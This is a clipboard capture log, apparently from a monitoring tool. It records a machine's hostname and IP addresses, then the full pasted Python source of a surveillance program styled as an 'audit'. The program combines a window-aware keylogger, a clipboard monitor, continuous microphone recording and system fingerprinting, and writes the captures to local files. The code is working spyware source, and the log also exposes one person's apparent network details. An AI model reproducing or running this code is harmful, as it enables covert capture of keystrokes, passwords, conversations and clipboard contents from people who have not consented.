
[2025-12-28 05:36:51.811978] Clipboard: 
[2025-12-28 05:35:03.225197] Clipboard: Timestamp: 2025-12-28 05:33:03.178752

System: Windows 10.0.19045

Processor: Intel64 Family 6 Model 78 Stepping 3, GenuineIntel

Hostname: LEO

Internal IP: 192.168.220.1

Public IP: 105.178.46.88




[2025-12-28 05:37:21.813265] Clipboard: Validate Python code snippets for syntax errors without saving to file. Returns syntax error details with line numbers and descriptions. Use for: validating generated code, checking user code snippets, pre-execution validation.

[05:43:20] import os
import socket
import platform
import requests
import threading
import time
from datetime import datetime

# Hardware/Media modules
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
import pygetwindow as gw # Required for Industry Standard context

# Input modules
from pynput.keyboard import Key, Listener

# --- Configuration & State ---
stop_event = threading.Event()
current_window = [None] # Use list to allow mutation inside threads

folder_path = os.path.dirname(os.path.abspath(__file__))
system_info_path = os.path.join(folder_path, "system.txt")
clipboard_path = os.path.join(folder_path, "clipboard.txt")
keys_path = os.path.join(folder_path, "key_log.txt")

# --- 1. SYSTEM INFORMATION ---
def get_system_info():
    hostname = socket.gethostname()
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except:
        public_ip = "Unknown"

    with open(system_info_path, "w") as f:
        f.write(f"AUDIT REPORT - {datetime.now()}\n" + "="*30 + "\n")
        f.write(f"OS: {platform.system()} {platform.release()}\n")
        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"Public IP: {public_ip}\n")

# --- 2. CLIPBOARD (Timed) ---
def clipboard_monitor():
    last_data = ""
    while not stop_event.is_set():
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            if data != last_data:
                with open(clipboard_path, "a", encoding="utf-8") as f:
                    f.write(f"\n[{datetime.now().strftime('%H:%M:%S')}] {data}\n")
                last_data = data
        except:
            try: win32clipboard.CloseClipboard() 
            except: pass
        time.sleep(5) # Industry standard: Check frequently but not constantly

# --- 3. MICROPHONE (High Quality) ---
def record_audio():
    fs = 44100 
    seconds = 10 
    while not stop_event.is_set():
        # Using float32 for higher fidelity
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait() 
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        audio_file = os.path.join(folder_path, f"audio_{timestamp}.wav")
        write(audio_file, fs, myrecording)
        
        # Stop check after each clip
        if stop_event.is_set(): break

# --- 4. KEYLOGGER (Structured) ---
def on_press(key):
    try:
        # Industry Standard: Detect Active Window
        window = gw.getActiveWindow()
        win_title = window.title if window else "Unknown"
        
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        with open(keys_path, "a", encoding="utf-8") as f:
            if win_title != current_window[0]:
                current_window[0] = win_title
                f.write(f"\n\n[{timestamp}] --- WINDOW: {win_title} ---\n")
            
            # Format characters
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                mapping = {Key.space: " ", Key.enter: "\n", Key.tab: "\t"}
                f.write(mapping.get(key, f"[{str(key).replace('Key.', '')}]"))
    except Exception as e:
        print(f"Log Error: {e}")

def on_release(key):
    if key == Key.esc:
        print("\n[*] ESC detected. Initiating shutdown...")
        stop_event.set()
        return False # Stops the listener

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    get_system_info()
    
    threads = [
        threading.Thread(target=clipboard_monitor),
        threading.Thread(target=record_audio)
    ]

    for t in threads:
        t.start()

    print(f"[*] Audit Active. Logging to {folder_path}")
    print("[!] Press ESC to stop all modules safely.")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # Once Listener stops, stop_event is already set. Wait for threads to finish current loop.
    print("[*] Cleaning up threads... please wait.")
    for t in threads:
        t.join(timeout=2)
    print("[*] All modules stopped. Files saved.")

[05:43:40] Validate Python code snippets for syntax errors without saving to file. Returns syntax error details with line numbers and descriptions. Use for: validating generated code, checking user code snippets, pre-execution validation.

[05:51:38] import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import os
from datetime import datetime


[20:42:26] Smog

[21:00:27] Smog
